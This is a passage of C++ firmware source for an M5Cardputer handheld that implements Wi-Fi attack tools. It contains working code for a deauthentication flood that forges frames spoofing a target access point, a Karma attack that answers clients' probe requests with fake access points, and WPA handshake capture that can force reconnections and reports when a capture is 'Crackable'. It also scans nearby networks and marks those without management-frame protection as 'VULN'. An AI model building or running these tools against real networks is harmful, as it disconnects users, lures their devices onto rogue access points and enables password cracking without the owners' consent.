    char ssid[SPAM_SSID_MAX + 1];
};
KarmaReq karmaQ[KARMA_QUEUE];
std::atomic<uint32_t> karmaQHead{0};
std::atomic<uint32_t> karmaQTail{0};
std::atomic<uint32_t> karmaSeen{0};
bool karmaRunning = false;
bool karmaHop = true;
int karmaCh = CH_FIRST;
uint32_t karmaDwellStart = 0;
uint32_t karmaResponses = 0;
uint32_t karmaErrors = 0;
uint32_t karmaLastDraw = 0;
char karmaLast[SPAM_SSID_MAX + 1] = "";

uint8_t deauthBssid[6] = {0};
int deauthCh = CH_FIRST;
char deauthSsid[SPAM_SSID_MAX + 1] = "";
bool deauthRunning = false;
uint32_t deauthBursts = 0;
uint32_t deauthSent = 0;
uint32_t deauthErrors = 0;
uint32_t deauthLastBurst = 0;
uint32_t deauthLastDraw = 0;

constexpr uint8_t CHK_SEEN = 0x01;
constexpr uint8_t CHK_RSN = 0x02;
constexpr uint8_t CHK_PSK = 0x04;
constexpr uint8_t CHK_SAE = 0x08;
constexpr uint8_t CHK_MFPC = 0x10;
constexpr uint8_t CHK_MFPR = 0x20;
std::atomic<uint8_t> checkFlags{0};
bool checkActive = false;
uint32_t checkEnd = 0;
enum PmfVerdict : uint8_t { V_NONE, V_NOT_SEEN, V_NO_PMF, V_PMF_OPTIONAL, V_PMF_REQUIRED };
PmfVerdict deauthVerdict = V_NONE;

const char *authLabel(wifi_auth_mode_t m) {
    switch (m) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
    case WIFI_AUTH_OWE: return "OWE";
    default: return "ENT";
    }
}

void attackRadio() {
    if (WiFi.getMode() != WIFI_AP_STA) {
        WiFi.mode(WIFI_AP_STA);
        WiFi.softAP("KaijuAtk", nullptr, 1, 1, 4, false);
    }
}

constexpr int NET_LIST_MAX = 32;
constexpr int PMF_MAX_APS = 40;
constexpr uint32_t PMF_DWELL_MS = 600;
constexpr int PMF_SWEEPS = 2;

struct PmfEntry {
    uint8_t bssid[6];
    uint8_t flags;
};
PmfEntry pmfTable[PMF_MAX_APS];
std::atomic<int> pmfCount{0};
bool pmfPassActive = false;
int pmfPassCh = CH_FIRST;
int pmfPassSweep = 0;
uint32_t pmfPassDwell = 0;

int dlCount = 0;
int dlSel = 0;
int dlTop = 0;
char dlSsid[NET_LIST_MAX][SPAM_SSID_MAX + 1];
uint8_t dlBssid[NET_LIST_MAX][6];
wifi_auth_mode_t dlAuth[NET_LIST_MAX];
int dlChan[NET_LIST_MAX];
int dlRssi[NET_LIST_MAX];
PmfVerdict dlVerdict[NET_LIST_MAX];

void parseRsn(const uint8_t *d, uint32_t n, uint8_t &flags) {
    flags |= CHK_RSN;
    uint32_t p = 6;
    if (p + 2 > n) return;
    uint32_t pairwise = d[p] | (d[p + 1] << 8);
    p += 2 + 4 * pairwise;
    if (p + 2 > n) return;
    uint32_t akm = d[p] | (d[p + 1] << 8);
    p += 2;
    for (uint32_t i = 0; i < akm && p + 4 <= n; i++) {
        if (d[p] == 0x00 && d[p + 1] == 0x0f && d[p + 2] == 0xac) {
            if (d[p + 3] == 8) flags |= CHK_SAE;
            if (d[p + 3] == 2) flags |= CHK_PSK;
        }
        p += 4;
    }
    if (p + 2 > n) return;
    uint8_t caps = d[p];
    if (caps & 0x80) flags |= CHK_MFPC;
    if (caps & 0x40) flags |= CHK_MFPR;
}

uint8_t parseBeaconFlags(const wifi_promiscuous_pkt_t *pkt, uint32_t len) {
    uint8_t flags = CHK_SEEN;
    uint32_t end = len - 4;
    uint32_t p = 36;
    while (p + 2 <= end) {
        uint8_t tag = pkt->payload[p];
        uint8_t tlen = pkt->payload[p + 1];
        if (p + 2 + tlen > end) break;
        if (tag == 48) parseRsn(&pkt->payload[p + 2], tlen, flags);
        p += 2 + tlen;
    }
    return flags;
}

PmfVerdict computeVerdict(uint8_t f) {
    if (!(f & CHK_SEEN)) return V_NOT_SEEN;
    if ((f & CHK_SAE) && !(f & CHK_PSK)) return V_PMF_REQUIRED;
    if (f & CHK_MFPR) return V_PMF_REQUIRED;
    if (f & CHK_MFPC) return V_PMF_OPTIONAL;
    return V_NO_PMF;
}

bool verdictAllowsDeauth(PmfVerdict v) {
    return v == V_NO_PMF || v == V_PMF_OPTIONAL;
}

const char *verdictTag(PmfVerdict v) {
    switch (v) {
    case V_NO_PMF: return "VULN";
    case V_PMF_OPTIONAL: return "PART";
    case V_PMF_REQUIRED: return "PMF";
    default: return "--";
    }
}

enum ListPurpose : uint8_t { PURPOSE_DEAUTH, PURPOSE_HANDSHAKE };
ListPurpose listPurpose = PURPOSE_DEAUTH;

const char *rowTag(int idx) {
    if (dlVerdict[idx] == V_NOT_SEEN) return dlRssi[idx] < -85 ? "weak" : "--";
    return verdictTag(dlVerdict[idx]);
}

void drawDeauthSelect() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char header[48];
    if (pmfPassActive) {
        snprintf(header, sizeof(header), "Checking ch%-2d  sweep %d/%d", pmfPassCh, pmfPassSweep + 1, PMF_SWEEPS);
    } else {
        snprintf(header, sizeof(header), "%s: %d networks (dBm)",
                 listPurpose == PURPOSE_HANDSHAKE ? "Handshake" : "Deauth", dlCount);
    }
    d.drawString(header, 4, 4);
    for (int row = 0; row < WIFI_VISIBLE_ROWS; row++) {
        int idx = dlTop + row;
        if (idx >= dlCount) break;
        int y = 18 + row * 12;
        if (idx == dlSel) {
            d.fillRect(0, y - 1, d.width(), 11, COLOR_PRIMARY);
            d.setTextColor(COLOR_BG, COLOR_PRIMARY);
        } else {
            d.setTextColor(COLOR_PRIMARY, COLOR_BG);
        }
        const char *nm = dlSsid[idx][0] != '\0' ? dlSsid[idx] : "<hidden>";
        char line[48];
        snprintf(line, sizeof(line), "%-12.12s %-6s %-4s ch%-2d %3d", nm, authLabel(dlAuth[idx]), rowTag(idx),
                 dlChan[idx], dlRssi[idx]);
        d.drawString(line, 4, y);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("VULN noPMF PART opt PMF req weak=far", 4, 114);
    if (pmfPassActive) {
        d.drawString("Bksp cancel check", 4, 124);
    } else if (listPurpose == PURPOSE_HANDSHAKE) {
        d.drawString("Enter capture  R sweep  Bksp back", 4, 124);
    } else {
        d.drawString("Enter check  R recheck  Bksp back", 4, 124);
    }
}

void loadDeauthScan() {
    int n = WiFi.scanNetworks();
    dlCount = n > 0 ? (n < NET_LIST_MAX ? n : NET_LIST_MAX) : 0;
    for (int i = 0; i < dlCount; i++) {
        snprintf(dlSsid[i], sizeof(dlSsid[i]), "%s", WiFi.SSID(i).c_str());
        WiFi.BSSID(i, dlBssid[i]);
        dlAuth[i] = WiFi.encryptionType(i);
        dlChan[i] = static_cast<int>(WiFi.channel(i));
        dlRssi[i] = static_cast<int>(WiFi.RSSI(i));
        dlVerdict[i] = V_NOT_SEEN;
    }
    dlSel = 0;
    dlTop = 0;
}

void onPmfPass(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 40 || ((pkt->payload[0] >> 4) & 0xF) != 0x8) return;
    int count = pmfCount.load(std::memory_order_relaxed);
    int idx = -1;
    for (int i = 0; i < count; i++) {
        if (memcmp(pmfTable[i].bssid, &pkt->payload[16], 6) == 0) {
            idx = i;
            break;
        }
    }
    if (idx < 0) {
        if (count >= PMF_MAX_APS) return;
        idx = count;
        memcpy(pmfTable[idx].bssid, &pkt->payload[16], 6);
        pmfTable[idx].flags = 0;
        pmfCount.store(count + 1, std::memory_order_release);
    }
    pmfTable[idx].flags |= parseBeaconFlags(pkt, len);
}

void onPmfCheck(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 40 || ((pkt->payload[0] >> 4) & 0xF) != 0x8) return;
    if (memcmp(&pkt->payload[16], deauthBssid, 6) != 0) return;
    checkFlags.fetch_or(parseBeaconFlags(pkt, len), std::memory_order_relaxed);
}

void tagDeauthList() {
    int count = pmfCount.load(std::memory_order_acquire);
    for (int i = 0; i < dlCount; i++) {
        dlVerdict[i] = V_NOT_SEEN;
        for (int j = 0; j < count; j++) {
            if (memcmp(pmfTable[j].bssid, dlBssid[i], 6) == 0) {
                dlVerdict[i] = computeVerdict(pmfTable[j].flags);
                break;
            }
        }
    }
}

void startPmfPass() {
    pmfCount.store(0, std::memory_order_release);
    for (int i = 0; i < dlCount; i++) dlVerdict[i] = V_NOT_SEEN;
    pmfPassCh = CH_FIRST;
    pmfPassSweep = 0;
    WiFi.mode(WIFI_STA);
    setAnalyzerChannel(pmfPassCh);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onPmfPass);
    esp_wifi_set_promiscuous(true);
    pmfPassActive = true;
    pmfPassDwell = millis();
    drawDeauthSelect();
}

void stopPmfPass() {
    if (!pmfPassActive) return;
    pmfPassActive = false;
    esp_wifi_set_promiscuous(false);
    delay(20);
    tagDeauthList();
}

void tickPmfPass() {
    if (!pmfPassActive) return;
    uint32_t now = millis();
    if (now - pmfPassDwell < PMF_DWELL_MS) return;
    pmfPassDwell = now;
    pmfPassCh++;
    if (pmfPassCh > CH_LAST) {
        pmfPassCh = CH_FIRST;
        pmfPassSweep++;
        if (pmfPassSweep >= PMF_SWEEPS) {
            stopPmfPass();
            drawDeauthSelect();
            return;
        }
    }
    setAnalyzerChannel(pmfPassCh);
    drawDeauthSelect();
}

void enterDeauthSelect() {
    attackRadio();
    drawWifiMessage("Scanning...");
    WiFi.scanDelete();
    loadDeauthScan();
    startPmfPass();
}

void moveDeauthSelection(int delta) {
    int next = dlSel + delta;
    if (next < 0 || next >= dlCount) return;
    dlSel = next;
    if (dlSel < dlTop) dlTop = dlSel;
    if (dlSel >= dlTop + WIFI_VISIBLE_ROWS) dlTop = dlSel - WIFI_VISIBLE_ROWS + 1;
    drawDeauthSelect();
}

void chooseDeauthTarget() {
    memcpy(deauthBssid, dlBssid[dlSel], 6);
    snprintf(deauthSsid, sizeof(deauthSsid), "%s", dlSsid[dlSel]);
    deauthCh = dlChan[dlSel];
}

void drawDeauthCheck() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[48];
    snprintf(line, sizeof(line), "Target: %s", deauthSsid);
    d.drawString(line, 4, 4);
    snprintf(line, sizeof(line), "ch%-2d %02X:%02X:%02X:%02X:%02X:%02X", deauthCh, deauthBssid[0], deauthBssid[1],
             deauthBssid[2], deauthBssid[3], deauthBssid[4], deauthBssid[5]);
    d.drawString(line, 4, 16);
    if (checkActive) {
        d.drawString("Listening for its beacon (3 s)...", 4, 40);
    } else if (deauthVerdict == V_NOT_SEEN) {
        d.drawString("NOT HEARD on this channel.", 4, 40);
        d.drawString("Don't attack: the AP isn't visible here.", 4, 52);
    } else if (deauthVerdict == V_NO_PMF) {
        d.drawString("VULNERABLE: PMF off", 4, 40);
        d.drawString("Deauth should work on its clients.", 4, 52);
    } else if (deauthVerdict == V_PMF_OPTIONAL) {
        d.drawString("PARTIAL: PMF optional", 4, 40);
        d.drawString("Works only on clients without PMF.", 4, 52);
    } else if (deauthVerdict == V_PMF_REQUIRED) {
        d.drawString("BLOCKED: PMF required", 4, 40);
        d.drawString("Deauth frames will be ignored.", 4, 52);
    }
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    if (!checkActive && verdictAllowsDeauth(deauthVerdict)) {
        d.drawString("Enter run  R retest  Bksp back", 4, 124);
    } else {
        d.drawString("R retest  Bksp back", 4, 124);
    }
}

void startDeauthCheck() {
    WiFi.mode(WIFI_STA);
    setAnalyzerChannel(deauthCh);
    checkFlags.store(0, std::memory_order_relaxed);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onPmfCheck);
    esp_wifi_set_promiscuous(true);
    checkActive = true;
    checkEnd = millis() + CHECK_WINDOW_MS;
    deauthVerdict = V_NONE;
    drawDeauthCheck();
}

void stopDeauthCheck() {
    if (!checkActive) return;
    checkActive = false;
    esp_wifi_set_promiscuous(false);
}

void tickDeauthCheck() {
    if (!checkActive) return;
    if (millis() >= checkEnd) {
        stopDeauthCheck();
        deauthVerdict = computeVerdict(checkFlags.load(std::memory_order_acquire));
        drawDeauthCheck();
    }
}

void deauthBurst() {
    uint8_t frame[DEAUTH_LEN];
    memcpy(frame, DEAUTH_TEMPLATE, DEAUTH_LEN);
    memcpy(frame + 10, deauthBssid, 6);
    memcpy(frame + 16, deauthBssid, 6);
    deauthBursts++;
    for (int i = 0; i < 3; i++) {
        if (wifiTx(WIFI_IF_AP, frame, DEAUTH_LEN) == ESP_OK) {
            deauthSent++;
        } else {
            deauthErrors++;
        }
        delay(1);
    }
}

void drawDeauthRun() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[48];
    snprintf(line, sizeof(line), "Deauth  ch%-2d  %s", deauthCh, deauthRunning ? "RUNNING" : "stopped");
    d.drawString(line, 4, 4);
    snprintf(line, sizeof(line), "AP: %s", deauthSsid);
    d.drawString(line, 4, 18);
    snprintf(line, sizeof(line), "Bursts %lu  sent %lu  errors %lu", (unsigned long)deauthBursts,
             (unsigned long)deauthSent, (unsigned long)deauthErrors);
    d.drawString(line, 4, 32);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter run  Bksp back", 4, 124);
}

void startDeauth() {
    attackRadio();
    setAnalyzerChannel(deauthCh);
    deauthBursts = 0;
    deauthSent = 0;
    deauthErrors = 0;
    deauthLastBurst = 0;
    deauthLastDraw = 0;
    deauthRunning = true;
    drawDeauthRun();
}

void stopDeauth() {
    deauthRunning = false;
}

void tickDeauth() {
    if (!deauthRunning) return;
    uint32_t now = millis();
    if (now - deauthLastBurst >= 50) {
        deauthLastBurst = now;
        deauthBurst();
    }
    if (now - deauthLastDraw >= 1000) {
        deauthLastDraw = now;
        drawDeauthRun();
    }
}

void enqueueKarma(const uint8_t *mac, uint8_t ch, const uint8_t *ssid, uint8_t len) {
    uint32_t head = karmaQHead.load(std::memory_order_relaxed);
    uint32_t tail = karmaQTail.load(std::memory_order_acquire);
    if (head - tail >= KARMA_QUEUE) return;
    KarmaReq &r = karmaQ[head % KARMA_QUEUE];
    memcpy(r.mac, mac, 6);
    r.ch = ch;
    memcpy(r.ssid, ssid, len);
    r.ssid[len] = '\0';
    r.ssidLen = len;
    karmaQHead.store(head + 1, std::memory_order_release);
}

void onKarma(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 28 || ((pkt->payload[0] >> 4) & 0xF) != 0x4) return;
    karmaSeen.fetch_add(1, std::memory_order_relaxed);
    uint32_t end = len - 4;
    uint32_t p = 24;
    while (p + 2 <= end) {
        uint8_t tag = pkt->payload[p];
        uint8_t tlen = pkt->payload[p + 1];
        if (p + 2 + tlen > end) return;
        if (tag == 0) {
            if (tlen > 0 && tlen <= SPAM_SSID_MAX) {
                enqueueKarma(&pkt->payload[10], pkt->rx_ctrl.channel, &pkt->payload[p + 2], tlen);
            }
            return;
        }
        p += 2 + tlen;
    }
}

void drawKarmaRun() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[48];
    const char *state = karmaRunning ? "RUNNING" : "stopped";
    if (karmaHop) {
        snprintf(line, sizeof(line), "Karma  hop 1-%d  %s", KARMA_CH_MAX, state);
    } else {
        snprintf(line, sizeof(line), "Karma  ch%-2d  %s", karmaCh, state);
    }
    d.drawString(line, 4, 4);
    snprintf(line, sizeof(line), "Probes seen %lu", (unsigned long)karmaSeen.load(std::memory_order_relaxed));
    d.drawString(line, 4, 18);
    snprintf(line, sizeof(line), "Responses %lu  errors %lu", (unsigned long)karmaResponses,
             (unsigned long)karmaErrors);
    d.drawString(line, 4, 32);
    snprintf(line, sizeof(line), "Last: %s", karmaLast);
    d.drawString(line, 4, 46);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter run  H hop  ;. ch  Bksp back", 4, 124);
}

void karmaSendFor(const KarmaReq &r) {
    uint8_t frame[SPAM_FRAME_MAX];
    bool moved = r.ch != karmaCh;
    if (moved) setAnalyzerChannel(r.ch);
    size_t len = buildMgmt(frame, 0x50, r.mac, KARMA_BSSID, r.ssid, r.ch);
    for (int k = 0; k < 2; k++) {
        if (wifiTx(WIFI_IF_AP, frame, len) == ESP_OK) {
            karmaResponses++;
        } else {
            karmaErrors++;
        }
    }
    len = buildMgmt(frame, 0x80, BCAST_ADDR, KARMA_BSSID, r.ssid, r.ch);
    if (wifiTx(WIFI_IF_AP, frame, len) == ESP_OK) {
        karmaResponses++;
    } else {
        karmaErrors++;
    }
    if (moved) setAnalyzerChannel(karmaCh);
}

void startKarma() {
    attackRadio();
    karmaQHead.store(0, std::memory_order_release);
    karmaQTail.store(0, std::memory_order_release);
    karmaSeen.store(0, std::memory_order_relaxed);
    karmaResponses = 0;
    karmaErrors = 0;
    karmaLast[0] = '\0';
    karmaLastDraw = 0;
    karmaDwellStart = millis();
    setAnalyzerChannel(karmaCh);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onKarma);
    esp_wifi_set_promiscuous(true);
    karmaRunning = true;
    drawKarmaRun();
}

void stopKarma() {
    if (!karmaRunning) return;
    karmaRunning = false;
    esp_wifi_set_promiscuous(false);
}

void tickKarma() {
    if (!karmaRunning) return;
    uint32_t now = millis();
    if (karmaHop && now - karmaDwellStart >= KARMA_DWELL_MS) {
        karmaDwellStart = now;
        karmaCh = karmaCh >= KARMA_CH_MAX ? CH_FIRST : karmaCh + 1;
        setAnalyzerChannel(karmaCh);
    }
    uint32_t tail = karmaQTail.load(std::memory_order_relaxed);
    uint32_t head = karmaQHead.load(std::memory_order_acquire);
    for (int n = 0; tail != head && n < 4; n++) {
        const KarmaReq &r = karmaQ[tail % KARMA_QUEUE];
        karmaSendFor(r);
        snprintf(karmaLast, sizeof(karmaLast), "%s", r.ssid);
        tail++;
    }
    karmaQTail.store(tail, std::memory_order_release);
    if (now - karmaLastDraw >= 1000) {
        karmaLastDraw = now;
        drawKarmaRun();
    }
}

constexpr uint8_t EAPOL_LLC[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
std::atomic<uint32_t> hsMsgCount[5] = {};
std::atomic<uint32_t> hsEapolTotal{0};
std::atomic<bool> hsBeaconSaved{false};
bool hsRunning = false;
bool hsDeauth = false;
uint32_t hsLastBurst = 0;
uint32_t hsLastDraw = 0;

int eapolMessageNumber(uint16_t ki) {
    bool install = ki & (1 << 6);
    bool ack = ki & (1 << 7);
    bool mic = ki & (1 << 8);
    bool secure = ki & (1 << 9);
    if (ack && !mic && !install) return 1;
    if (!ack && mic && !install && !secure) return 2;
    if (ack && mic && install) return 3;
    if (!ack && mic && !install && secure) return 4;
    return 0;
}

void onHandshake(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!pcapActive.load(std::memory_order_acquire)) return;
    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
    const uint8_t *p = pkt->payload;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;
    if (type == WIFI_PKT_MGMT) {
        if (((p[0] >> 4) & 0xF) != 0x8) return;
        if (memcmp(&p[16], deauthBssid, 6) != 0) return;
        if (hsBeaconSaved.exchange(true, std::memory_order_relaxed)) return;
        pcapEnqueue(pkt);
        return;
    }
    if (type != WIFI_PKT_DATA) return;
    bool toDs = p[1] & 0x01;
    bool fromDs = p[1] & 0x02;
    bool qos = p[0] & 0x80;
    uint32_t hdr = 24 + ((toDs && fromDs) ? 6 : 0) + (qos ? 2 : 0);
    if (len < hdr + 17) return;
    if (memcmp(&p[hdr], EAPOL_LLC, 8) != 0) return;
    if (memcmp(&p[4], deauthBssid, 6) != 0 && memcmp(&p[10], deauthBssid, 6) != 0 &&
        memcmp(&p[16], deauthBssid, 6) != 0) {
        return;
    }
    hsEapolTotal.fetch_add(1, std::memory_order_relaxed);
    int msg = eapolMessageNumber(static_cast<uint16_t>((p[hdr + 13] << 8) | p[hdr + 14]));
    if (msg > 0) hsMsgCount[msg].fetch_add(1, std::memory_order_relaxed);
    pcapEnqueue(pkt);
}

void drawHandshake() {
    auto &d = M5Cardputer.Display;
    d.fillScreen(COLOR_BG);
    d.setTextSize(1);
    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
    char line[48];
    snprintf(line, sizeof(line), "Handshake  ch%-2d  %s", deauthCh, hsRunning ? "RUNNING" : "stopped");
    d.drawString(line, 4, 4);
    snprintf(line, sizeof(line), "AP: %s", deauthSsid);
    d.drawString(line, 4, 16);
    uint32_t m1 = hsMsgCount[1].load(std::memory_order_relaxed);
    uint32_t m2 = hsMsgCount[2].load(std::memory_order_relaxed);
    uint32_t m3 = hsMsgCount[3].load(std::memory_order_relaxed);
    uint32_t m4 = hsMsgCount[4].load(std::memory_order_relaxed);
    snprintf(line, sizeof(line), "M1 %lu  M2 %lu  M3 %lu  M4 %lu", (unsigned long)m1, (unsigned long)m2,
             (unsigned long)m3, (unsigned long)m4);
    d.drawString(line, 4, 30);
    snprintf(line, sizeof(line), "EAPOL %lu  beacon %s  deauth %s",
             (unsigned long)hsEapolTotal.load(std::memory_order_relaxed),
             hsBeaconSaved.load(std::memory_order_relaxed) ? "yes" : "no", hsDeauth ? "on" : "off");
    d.drawString(line, 4, 42);
    bool crackable = m2 > 0 && (m1 > 0 || m3 > 0);
    d.drawString(crackable ? "Crackable: YES (M2 + M1 or M3)" : "Crackable: not yet", 4, 58);
    if (pcapActive.load(std::memory_order_acquire)) {
        snprintf(line, sizeof(line), "%s  %lu KB", pcapName, (unsigned long)(pcapBytes / 1024));
    } else {
        snprintf(line, sizeof(line), "%s", pcapMsg);
    }
    d.drawString(line, 4, 72);
    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
    d.drawString("Enter run  D deauth  Bksp back", 4, 124);
}

void enterHandshakeSelect() {
    attackRadio();
    drawWifiMessage("Scanning...");
    WiFi.scanDelete();
    loadDeauthScan();
    drawDeauthSelect();
}

void startHandshake() {
    attackRadio();
    startPcap("hs");
    if (!pcapActive.load(std::memory_order_acquire)) return;
    setAnalyzerChannel(deauthCh);
    for (auto &c : hsMsgCount) c.store(0, std::memory_order_relaxed);
    hsEapolTotal.store(0, std::memory_order_relaxed);
    hsBeaconSaved.store(false, std::memory_order_relaxed);
    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&onHandshake);
    esp_wifi_set_promiscuous(true);
    hsRunning = true;
    hsLastBurst = 0;
    hsLastDraw = 0;
    drawHandshake();
}

void stopHandshake() {
    if (!hsRunning) return;
    hsRunning = false;
    esp_wifi_set_promiscuous(false);
    delay(20);
    stopPcap();
}

void tickHandshake() {
    if (!hsRunning) return;
    uint32_t now = millis();
    if (hsDeauth && now - hsLastBurst >= 300) {
        hsLastBurst = now;
        deauthBurst();
    }
    if (now - hsLastDraw >= 1000) {
        hsLastDraw = now;
        drawHandshake();
    }
}

bool wordHas(const std::vector<char> &word, char c) {
    for (char w : word) {
        if (tolower(w) == c) return true;
    }
    return false;
}

}  // namespace

void setup() {
    auto cfg = M5.config();
    M5Cardputer.begin(cfg, true);
    M5Cardputer.Display.setRotation(1);
    drawSplash();
    delay(2000);
    drawMenu();
}

void loop() {
    M5Cardputer.update();
    if (screen == Screen::WifiChannels) tickChannelAnalyzer();
    if (screen == Screen::WifiSniff) {
        pcapFlush(8192);
        tickSniffer();
    }
    if (screen == Screen::WifiSpamRun) tickSpam();
    if (screen == Screen::WifiDeauthCheck) tickDeauthCheck();
    if (screen == Screen::WifiDeauthSelect) tickPmfPass();
    if (screen == Screen::WifiDeauthRun) tickDeauth();
    if (screen == Screen::WifiKarmaRun) tickKarma();
    if (screen == Screen::WifiHsRun) {
        pcapFlush(8192);
        tickHandshake();
    }
    if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed()) return;

    auto &ks = M5Cardputer.Keyboard.keysState();
    bool up = ks.up || wordHas(ks.word, ';') || wordHas(ks.word, 'w');
    bool down = ks.down || wordHas(ks.word, '.') || wordHas(ks.word, 's');
    bool back = ks.backspace || ks.esc;

    switch (screen) {
    case Screen::Menu:
        if (up) {
            selected = (selected + MENU_COUNT - 1) % MENU_COUNT;
            drawMenu();
        } else if (down) {
            selected = (selected + 1) % MENU_COUNT;
            drawMenu();
        } else if (ks.enter) {
            if (selected == WIFI_ITEM) {
                screen = Screen::WifiMenu;
                wifiToolSel = 0;
                drawWifiMenu();
            } else {
                screen = Screen::Placeholder;
                drawPlaceholder();
            }
        }
        break;

    case Screen::Placeholder:
        if (back) {
            screen = Screen::Menu;
            drawMenu();
        }
        break;

    case Screen::WifiMenu:
        if (back) {
            screen = Screen::Menu;
            drawMenu();
        } else if (up) {
            wifiToolSel = (wifiToolSel + WIFI_TOOL_COUNT - 1) % WIFI_TOOL_COUNT;
            drawWifiMenu();
        } else if (down) {
            wifiToolSel = (wifiToolSel + 1) % WIFI_TOOL_COUNT;
            drawWifiMenu();
        } else if (ks.enter) {
            if (wifiToolSel == WIFI_TOOL_SCAN) {
                screen = Screen::WifiScan;
                scanWifi();
            } else if (wifiToolSel == WIFI_TOOL_CHANNELS) {
                screen = Screen::WifiChannels;
                startChannelAnalyzer();
            } else if (wifiToolSel == WIFI_TOOL_SNIFF) {
                screen = Screen::WifiSniff;
                startSniffer();
            } else if (wifiToolSel == WIFI_TOOL_BEACON) {
                screen = Screen::WifiSpamSelect;
                spamMsg[0] = '\0';
                drawSpamSelect();
            } else if (wifiToolSel == WIFI_TOOL_DEAUTH) {
                screen = Screen::WifiDeauthSelect;
                listPurpose = PURPOSE_DEAUTH;
                enterDeauthSelect();
            } else if (wifiToolSel == WIFI_TOOL_HANDSHAKE) {
                screen = Screen::WifiDeauthSelect;
                listPurpose = PURPOSE_HANDSHAKE;
                enterHandshakeSelect();
            } else if (wifiToolSel == WIFI_TOOL_KARMA) {
                screen = Screen::WifiKarmaRun;
                startKarma();
            }
        }
        break;

    case Screen::WifiScan:
        if (back) {
            WiFi.scanDelete();
            screen = Screen::WifiMenu;
            drawWifiMenu();
        } else if (up) {
            moveWifiSelection(-1);
        } else if (down) {
            moveWifiSelection(1);
        } else if (ks.enter) {
            scanWifi();
        }
        break;

    case Screen::WifiChannels:
        if (back) {
            stopChannelAnalyzer();
            screen = Screen::WifiMenu;
            drawWifiMenu();
        }
        break;

    case Screen::WifiSniff:
        if (back) {
            stopSniffer();
            screen = Screen::WifiMenu;
            drawWifiMenu();
        } else if (ks.enter) {
            sniffHop = !sniffHop;
            sniffDwellStart = millis();
            drawSniffer();
        } else if (wordHas(ks.word, 'r')) {
            toggleRecording();
            drawSniffer();
        } else if (up) {
            moveSnifferChannel(-1);
        } else if (down) {
            moveSnifferChannel(1);
        }
        break;

    case Screen::WifiSpamSelect:
        if (back) {
            screen = Screen::WifiMenu;
            drawWifiMenu();
        } else if (up) {
            spamModeSel = (spamModeSel + SPAM_MODE_COUNT - 1) % SPAM_MODE_COUNT;
            spamMsg[0] = '\0';
            drawSpamSelect();
        } else if (down) {
            spamModeSel = (spamModeSel + 1) % SPAM_MODE_COUNT;
            spamMsg[0] = '\0';
            drawSpamSelect();
        } else if (ks.enter) {
            spamMode = static_cast<SpamMode>(spamModeSel);
            if (spamMode == SPAM_SINGLE) {
                spamTextLen = 0;
                spamText[0] = '\0';
                screen = Screen::WifiSpamText;
                drawSpamText();
            } else if (spamMode == SPAM_CUSTOM && !loadSpamCustom()) {
                drawSpamSelect();
            } else {
                screen = Screen::WifiSpamRun;
                drawSpamRun();
            }
        }
        break;

    case Screen::WifiSpamText:
        if (ks.esc) {
            screen = Screen::WifiSpamSelect;
            drawSpamSelect();
        } else if (ks.backspace) {
            if (spamTextLen > 0) {
                spamText[--spamTextLen] = '\0';
                drawSpamText();
            } else {
                screen = Screen::WifiSpamSelect;
                drawSpamSelect();
            }
        } else if (ks.enter) {
            if (spamTextLen > 0) {
                snprintf(spamBase, sizeof(spamBase), "%s", spamText);
                spamCounter = 1;
                screen = Screen::WifiSpamRun;
                drawSpamRun();
            }
        } else {
            bool changed = false;
            for (char c : ks.word) {
